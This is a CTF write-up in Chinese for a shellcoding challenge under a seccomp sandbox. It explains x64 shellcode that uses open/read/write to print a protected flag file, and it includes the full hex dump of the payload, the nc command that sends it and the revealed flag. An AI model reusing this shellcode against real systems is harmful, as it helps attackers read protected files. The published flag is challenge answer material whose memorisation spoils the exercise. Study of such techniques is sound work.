## Source code
根據題目源碼，我們只能使用 `open`, `read`, `write`, `exit`, `exit_group` 五個 syscalls
```
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
```

## Shellcode
本來想用 call-pop trick 寫比較方便，沒想到死活執行不了，實在是不知道爲什麼 @@，太可惡了吧

於是借用了[這篇文章](https://www.zzz4ck.com/blog/2018/08/11/pwnable_kr_asm/) 把很長的 filename 推到 call stack 上

push 完之後：

1. sys_open() 開檔（filename 的 ptr 就是 rsp 的值）
2. 先 `sub rsp, n` 預留 n bytes 的 buffer，然後 sys_read() 讀檔案內容進這個 buffer
3. sys_write() 把檔案內容寫到 stdout

來稍微偷看一下 shell.bin 的內容
```
asm@prowl:~$ xxd /tmp/aesophor_asm/shell.bin
00000000: 5248 b86f 306f 306f 6e67 0050 48b8 6f30  RH.o0o0ong.PH.o0
00000010: 6f30 6f30 6f30 5048 b830 3030 3030 3030  o0o0o0PH.0000000
00000020: 3050 48b8 6f6f 6f6f 3030 3030 5048 b86f  0PH.oooo0000PH.o
00000030: 6f6f 6f6f 6f6f 6f50 5048 b830 3030 3030  oooooooPPH.00000
00000040: 6f6f 6f50 48b8 3030 3030 3030 3030 5050  oooPH.00000000PP
00000050: 48b8 6f6f 6f6f 3030 3030 5048 b86f 6f6f  H.oooo0000PH.ooo
00000060: 6f6f 6f6f 6f50 5050 5050 5050 5050 48b8  oooooPPPPPPPPPH.
00000070: 735f 7665 7279 5f6c 5048 b865 5f6e 616d  s_very_lPH.e_nam
00000080: 655f 6950 48b8 5f74 6865 5f66 696c 5048  e_iPH._the_filPH
00000090: b86c 652e 736f 7272 7950 48b8 5f74 6869  .le.sorryPH._thi
000000a0: 735f 6669 5048 b861 7365 5f72 6561 6450  s_fiPH.ase_readP
000000b0: 48b8 6669 6c65 5f70 6c65 5048 b86b 725f  H.file_plePH.kr_
000000c0: 666c 6167 5f50 48b8 7077 6e61 626c 652e  flag_PH.pwnable.
000000d0: 5048 b874 6869 735f 6973 5f50 4831 c004  PH.this_is_PH1..
000000e0: 0248 89e7 4831 f648 31d2 0f05 4889 c748  .H..H1.H1...H..H
000000f0: 31c0 4883 ec32 4889 e6ba 3200 0000 0f05  1.H..2H...2.....
00000100: 4889 c248 31c0 48ff c048 31ff 48ff c748  H..H1.H..H1.H..H
00000110: 89e6 0f05 c3                             .....
```

## Pwn
首先用 GNU Make 做出 shell.bin 之後 scp 上傳到 server:/tmp 下自己的目錄

接下來就把 shell.bin 的內容 pipe 到 process 裏
```
asm@prowl:~$ cat /tmp/aesophor_asm/shell.bin | nc 0 9026
Welcome to shellcoding practice challenge.
In this challenge, you can run your x64 shellcode under SECCOMP sandbox.
Try to make shellcode that spits flag using open()/read()/write() systemcalls only.
If this does not challenge you. you should play 'asg' challenge :)
give me your x64 shellcode: Mak1ng_shelLcodE_i5_veRy_eaSy
```

flag: `Mak1ng_shelLcodE_i5_veRy_eaSy`
